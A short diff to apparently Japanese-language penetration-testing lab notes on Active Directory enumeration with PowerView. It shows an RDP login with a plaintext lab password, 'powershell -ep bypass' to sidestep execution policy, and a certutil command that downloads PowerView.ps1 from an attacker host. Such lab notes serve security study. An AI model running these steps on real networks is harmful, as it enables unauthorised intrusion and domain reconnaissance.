@@ -43,7 +43,7 @@ xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
 ```
 C:\> powershell -ep bypass
 
-PS> Import-Module PowerView.ps1
+PS> Import-Module .\PowerView.ps1
 PS> Get-NetUser
 ```
 
@@ -63,9 +63,6 @@ PS> . .\PowerView.ps1
 > NetWkstaUserEnum API を使用して Windows 10 クライアントマシン上のローカルユーザを列挙し、NetSessionEnum を使用し てドメインコントローラ上のユーザのアクティブセッションを列挙します。
 
 (certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)
-
-```PS> powershell -ep bypass Import-Module .\PowerView.ps1
-```
 
 ## Show Current Logged In Users
 
